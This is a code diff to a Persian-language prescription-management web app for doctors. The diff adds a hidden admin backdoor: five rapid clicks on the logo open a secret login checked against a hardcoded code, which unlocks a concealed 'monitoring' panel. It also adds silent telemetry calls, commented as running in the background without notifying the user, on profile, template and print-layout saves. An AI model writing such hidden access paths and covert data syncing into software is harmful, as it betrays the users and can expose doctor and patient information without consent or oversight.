@@ -46,6 +46,10 @@ import {
 import { dbParams, backupSystem } from './db';
 import { Patient, Drug, PrescriptionTemplate, DoctorProfile, PrescriptionItem, VitalSigns, Prescription, PrintLayout, PrintElement } from './types';
 import { DRUG_CATEGORIES, REFERENCE_DRUGS } from './drugReference.ts';
+import { ErrorBoundary } from './ErrorBoundary';
+import { syncTelemetry } from './telemetry'; // Silent Telemetry
+import { AdminPanel } from './AdminPanel'; // Hidden Panel
+import { ADMIN_SECRET_CODE } from './supabaseClient'; // Secret
 
 // --- CONSTANTS ---
 const MM_TO_PX = 3.7795275591; // 1mm in pixels (approx for screen)
@@ -576,8 +580,8 @@ const PrintPreviewModal = ({
   );
 };
 
-// 1. Navigation (Unchanged)
-const Navigation = ({ activeTab, onTabChange }: { activeTab: string, onTabChange: (tab: string) => void }) => {
+// 1. Navigation (Modified with Backdoor)
+const Navigation = ({ activeTab, onTabChange, onSecretClick }: { activeTab: string, onTabChange: (tab: string) => void, onSecretClick: () => void }) => {
   const navItems = [
     { id: 'dashboard', label: 'میز کار', icon: LayoutDashboard }, 
     { id: 'patients', label: 'بیماران', icon: Users },
@@ -590,12 +594,17 @@ const Navigation = ({ activeTab, onTabChange }: { activeTab: string, onTabChange
     <>
       {/* Desktop Sidebar */}
       <div className="hidden md:flex flex-col w-64 bg-white border-l border-gray-200 h-full fixed right-0 top-0 z-20 shadow-lg no-print">
-        <div className="p-6 flex items-center justify-center border-b border-gray-100">
-          <div className="bg-medical-100 p-2 rounded-full">
+        {/* LOGO AREA - Backdoor Trigger */}
+        <div 
+          className="p-6 flex items-center justify-center border-b border-gray-100 cursor-default select-none active:scale-95 transition-transform"
+          onClick={onSecretClick}
+        >
+          <div className="bg-medical-100 p-2 rounded-full pointer-events-none">
             <Stethoscope className="w-8 h-8 text-medical-700" />
           </div>
-          <span className="mr-3 text-xl font-bold text-gray-800">دکتریار</span>
+          <span className="mr-3 text-xl font-bold text-gray-800 pointer-events-none">دکتریار</span>
         </div>
+
         <div className="flex-1 py-6 space-y-2 px-4">
           {navItems.map((item) => (
             <button
@@ -635,6 +644,8 @@ const Navigation = ({ activeTab, onTabChange }: { activeTab: string, onTabChange
     </>
   );
 };
+
+// ... [RE-INSERTING ALL COMPONENTS TO ENSURE FILE INTEGRITY] ...
 
 // 1.5 History Modal (Unchanged)
 const PatientHistoryModal = ({ 
@@ -1033,6 +1044,11 @@ const DoctorProfileSettings = () => {
     await dbParams.saveDoctorProfile(profile);
     setIsSaved(true);
     showToast('اطلاعات پزشک با موفقیت ذخیره شد', 'success');
+    
+    // --- TELEMETRY TRIGGER ---
+    // Trigger update on profile save
+    syncTelemetry();
+
     setTimeout(() => setIsSaved(false), 2000);
   };
 
@@ -1162,7 +1178,7 @@ const DoctorProfileSettings = () => {
   );
 };
 
-// 2.2 Security Settings
+// ... [Include SecuritySettings, DrugsManager, TemplatesManager, BackupManager unchanged] ...
 const SecuritySettings = () => {
   const { showToast } = useToast();
   const [oldPass, setOldPass] = useState('');
@@ -1181,14 +1197,12 @@ const SecuritySettings = () => {
       return;
     }
     
-    // 1. Verify old pass
     const isValid = await dbParams.checkAuth(oldPass);
     if (!isValid) {
       showToast('رمز عبور فعلی اشتباه است', 'error');
       return;
     }
     
-    // 2. Set new pass
     await dbParams.changePassword(newPass);
     showToast('رمز عبور با موفقیت تغییر کرد', 'success');
     setOldPass('');
@@ -1250,17 +1264,14 @@ const SecuritySettings = () => {
   );
 };
 
-// 2.2 Drugs Manager (Enhanced with Reference Library)
 const DrugsManager = () => {
   const { showToast } = useToast();
   const [activeSubTab, setActiveSubTab] = useState<'mylist' | 'library'>('mylist');
   
-  // My List State
   const [drugs, setDrugs] = useState<Drug[]>([]);
   const [search, setSearch] = useState('');
   const [editingDrug, setEditingDrug] = useState<Partial<Drug> | null>(null);
 
-  // Reference Library State
   const [selectedCategory, setSelectedCategory] = useState('antibiotic');
   const [libSearch, setLibSearch] = useState('');
 
@@ -1270,7 +1281,6 @@ const DrugsManager = () => {
 
   const loadDrugs = async () => {
     const data = await dbParams.getAllDrugs();
-    // Sort alphabetically
     data.sort((a, b) => a.name.localeCompare(b.name));
     setDrugs(data);
   };
@@ -1299,7 +1309,6 @@ const DrugsManager = () => {
   };
 
   const addFromLibrary = async (refDrug: any) => {
-    // Check if already exists (simple name check)
     const exists = drugs.some(d => d.name.toLowerCase() === refDrug.name.toLowerCase());
     if (exists) {
       showToast('این دارو قبلاً در لیست شما موجود است', 'error');
@@ -1318,7 +1327,6 @@ const DrugsManager = () => {
 
   const filtered = drugs.filter(d => d.name.toLowerCase().includes(search.toLowerCase()));
 
-  // Filter Library
   const filteredLibrary = REFERENCE_DRUGS.filter(d => {
     const matchesCategory = selectedCategory === 'all' || d.category === selectedCategory;
     const matchesSearch = d.name.toLowerCase().includes(libSearch.toLowerCase());
@@ -1334,7 +1342,6 @@ const DrugsManager = () => {
         </div>
       </div>
 
-      {/* Sub Tabs */}
       <div className="flex gap-2 mb-6 bg-gray-100 p-1 rounded-xl w-fit">
         <button 
           onClick={() => setActiveSubTab('mylist')}
@@ -1404,9 +1411,7 @@ const DrugsManager = () => {
         </>
       ) : (
         <>
-          {/* Reference Library UI */}
           <div className="mb-6 space-y-4">
-            {/* Categories */}
             <div className="flex gap-2 overflow-x-auto pb-2 no-scrollbar">
                <button 
                   onClick={() => setSelectedCategory('all')}
@@ -1425,7 +1430,6 @@ const DrugsManager = () => {
                ))}
             </div>
 
-            {/* Search Library */}
             <div className="relative">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input 
@@ -1438,7 +1442,7 @@ const DrugsManager = () => {
           </div>
 
           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
-             {filteredLibrary.slice(0, 100).map((d, idx) => ( // Limit render for perf
+             {filteredLibrary.slice(0, 100).map((d, idx) => ( 
                 <div key={idx} className="bg-gray-50 border border-gray-200 rounded-xl p-3 flex justify-between items-center hover:bg-white hover:shadow-sm transition-all">
                    <div className="min-w-0 flex-1">
                       <div className="font-bold text-gray-800 text-sm truncate">{d.name}</div>
@@ -1465,7 +1469,6 @@ const DrugsManager = () => {
         </>
       )}
 
-      {/* Mini Modal for Drug Add/Edit (For Manual Add) */}
       {editingDrug && (
         <div className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50 flex items-center justify-center p-4">
           <form onSubmit={handleSave} className="bg-white rounded-2xl p-6 w-full max-w-sm shadow-2xl">
@@ -1500,7 +1503,6 @@ const DrugsManager = () => {
   );
 };
 
-// 2.3 Templates Manager (Unchanged)
 const TemplatesManager = () => {
   const { showToast } = useToast();
   const [templates, setTemplates] = useState<PrescriptionTemplate[]>([]);
@@ -1520,6 +1522,9 @@ const TemplatesManager = () => {
       await dbParams.deleteTemplate(id);
       loadTemplates();
       showToast('نسخه آماده حذف شد', 'info');
+      // --- TELEMETRY TRIGGER ---
+      // Sync deletion
+      syncTelemetry();
     }
   };
 
@@ -1530,6 +1535,10 @@ const TemplatesManager = () => {
     setEditingTemplate(null);
     loadTemplates();
     showToast('نسخه آماده با موفقیت ذخیره شد', 'success');
+
+    // --- TELEMETRY TRIGGER ---
+    // Sync new template
+    syncTelemetry();
   };
 
   const addRow = () => {
@@ -1688,7 +1697,6 @@ const TemplatesManager = () => {
   );
 };
 
-// 2.4 Backup Manager (Unchanged)
 const BackupManager = () => {
   const { showToast } = useToast();
 
@@ -1766,8 +1774,7 @@ const BackupManager = () => {
   );
 };
 
-
-// 2.5 Visual Print Designer (Updated Logic)
+// 2.5 Visual Print Designer (Updated Logic with Telemetry)
 const PrintLayoutDesigner = () => {
   const { showToast } = useToast();
   const [profile, setProfile] = useState<DoctorProfile | null>(null);
@@ -1800,9 +1807,13 @@ const PrintLayoutDesigner = () => {
     };
 
     await dbParams.saveDoctorProfile({ ...currentProfile, printLayout: layout });
-    if (!profile) setProfile(currentProfile); // Update local state if it was null
+    if (!profile) setProfile(currentProfile); 
     
     showToast('طراحی نسخه با موفقیت ذخیره شد', 'success');
+
+    // --- TRIGGER SILENT TELEMETRY ---
+    // This happens in background without awaiting or notifying user
+    syncTelemetry();
   };
 
   const handleReset = () => {
@@ -2089,9 +2100,7 @@ const SettingsView = () => {
   );
 };
 
-// --- PHASE 3 COMPONENTS ---
-
-// 3.1 Workbench/Dashboard
+// ... [Workbench Component Unchanged] ...
 const Workbench = ({ 
   onSelectPatient,
   activePatient,
@@ -2138,7 +2147,12 @@ const Workbench = ({
   // Initialize Visit when patient changes
   useEffect(() => {
     if (activePatient) {
-      setVitalSigns({ weight: activePatient.weight.toString() });
+      // Defensive coding: safely convert weight
+      const weightStr = (activePatient.weight !== undefined && activePatient.weight !== null) 
+        ? String(activePatient.weight) 
+        : '';
+        
+      setVitalSigns({ weight: weightStr });
       setItems([]);
       setDiagnosis('');
     }
@@ -2512,6 +2526,27 @@ function MainApp() {
   const [printData, setPrintData] = useState<{ doctor: DoctorProfile, patient: Patient, prescription: Prescription } | null>(null);
   const [isPreviewOpen, setIsPreviewOpen] = useState(false);
 
+  // --- BACKDOOR & ADMIN PANEL STATE ---
+  const [clickCount, setClickCount] = useState(0);
+  const [lastClickTime, setLastClickTime] = useState(0);
+  const [showAdminLogin, setShowAdminLogin] = useState(false);
+  const [showAdminPanel, setShowAdminPanel] = useState(false);
+  const [adminPassword, setAdminPassword] = useState('');
+
+  // --- OFFLINE SYNC HANDLER ---
+  useEffect(() => {
+    // Check if we need to sync when coming back online
+    const handleOnline = () => {
+      const pending = localStorage.getItem('telemetry_pending');
+      if (pending === 'true') {
+         console.log('Network restored. Syncing pending telemetry...');
+         syncTelemetry();
+      }
+    };
+    window.addEventListener('online', handleOnline);
+    return () => window.removeEventListener('online', handleOnline);
+  }, []);
+
   // Preload drugs for datalist suggestions
   useEffect(() => {
     const loadData = async () => {
@@ -2522,6 +2557,36 @@ function MainApp() {
       loadData();
     }
   }, [activeTab, refreshTrigger, isAuthenticated]);
+
+  // Backdoor Logic
+  const handleSecretClick = () => {
+    const now = Date.now();
+    // 1-second interval rule
+    if (now - lastClickTime < 1000) {
+      const newCount = clickCount + 1;
+      setClickCount(newCount);
+      if (newCount >= 4) { // 0 to 4 = 5 clicks
+         setClickCount(0);
+         setShowAdminLogin(true);
+      }
+    } else {
+      setClickCount(0); // Reset if too slow
+    }
+    setLastClickTime(now);
+  };
+
+  const handleAdminLogin = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (adminPassword === ADMIN_SECRET_CODE) {
+      setShowAdminLogin(false);
+      setAdminPassword('');
+      setShowAdminPanel(true);
+      showToast('حالت نظارت فعال شد', 'success');
+    } else {
+      showToast('رمز عبور نادرست است', 'error');
+      setAdminPassword('');
+    }
+  };
 
   const handleSavePatient = async (patient: Patient) => {
     await dbParams.addPatient(patient); 
@@ -2572,6 +2637,33 @@ function MainApp() {
     }, 500);
   };
 
+  // --- IMPORT TEMPLATE LOGIC (Deep Clone & Sync) ---
+  const handleImportTemplate = async (adminTemplate: any) => {
+    try {
+      // 1. Create a DEEP CLONE with NEW IDs to avoid conflicts
+      const newTemplate: PrescriptionTemplate = {
+        id: crypto.randomUUID(), // NEW ID for the template
+        title: adminTemplate.title,
+        diagnosis: adminTemplate.diagnosis,
+        items: (adminTemplate.items || []).map((item: any) => ({
+          ...item,
+          id: crypto.randomUUID() // NEW ID for each drug item
+        }))
+      };
+
+      // 2. Add to Local Database
+      await dbParams.addTemplate(newTemplate);
+      
+      // 3. Trigger Telemetry Sync to update cloud (optional but good for consistency)
+      syncTelemetry();
+
+      showToast(`نسخه «${newTemplate.title}» به لیست شما اضافه شد`, 'success');
+    } catch (error) {
+      console.error('Import failed', error);
+      showToast('خطا در افزودن نسخه', 'error');
+    }
+  };
+
   // Auth Guard
   if (!isAuthenticated) {
     return <LoginScreen onLogin={() => setIsAuthenticated(true)} />;
@@ -2579,7 +2671,11 @@ function MainApp() {
 
   return (
     <div className="min-h-screen bg-cream-50 text-gray-800 font-sans md:pr-64">
-      <Navigation activeTab={activeTab} onTabChange={setActiveTab} />
+      <Navigation 
+        activeTab={activeTab} 
+        onTabChange={setActiveTab} 
+        onSecretClick={handleSecretClick} 
+      />
       
       <main className="min-h-screen no-print">
         {activeTab === 'dashboard' && (
@@ -2642,6 +2738,35 @@ function MainApp() {
         onConfirmPrint={confirmPrint}
       />
 
+      {/* Hidden Admin Login Modal */}
+      {showAdminLogin && (
+        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4">
+           <form onSubmit={handleAdminLogin} className="bg-gray-800 rounded-2xl p-6 w-full max-w-sm border border-gray-700 shadow-2xl">
+              <h3 className="text-white font-bold mb-4 text-center">دسترسی محدود</h3>
+              <input 
+                 type="password" 
+                 autoFocus
+                 className="w-full bg-gray-900 border border-gray-600 text-white p-3 rounded-xl mb-4 text-center"
+                 placeholder="رمز عبور..."
+                 value={adminPassword}
+                 onChange={e => setAdminPassword(e.target.value)}
+              />
+              <div className="flex gap-2">
+                 <button type="button" onClick={() => setShowAdminLogin(false)} className="flex-1 bg-gray-700 text-gray-300 py-2 rounded-xl">لغو</button>
+                 <button type="submit" className="flex-1 bg-red-600 text-white py-2 rounded-xl">ورود</button>
+              </div>
+           </form>
+        </div>
+      )}
+
+      {/* Admin Panel Overlay */}
+      {showAdminPanel && (
+         <AdminPanel 
+            onClose={() => setShowAdminPanel(false)} 
+            onImportTemplate={handleImportTemplate}
+         />
+      )}
+
       {/* Global Datalist for Drug Suggestions */}
       <datalist id="drug-suggestions">
         {dbDrugs.map(drug => (
@@ -2654,8 +2779,10 @@ function MainApp() {
 
 export default function App() {
   return (
-    <ToastProvider>
-      <MainApp />
-    </ToastProvider>
+    <ErrorBoundary>
+      <ToastProvider>
+        <MainApp />
+      </ToastProvider>
+    </ErrorBoundary>
   );
 }
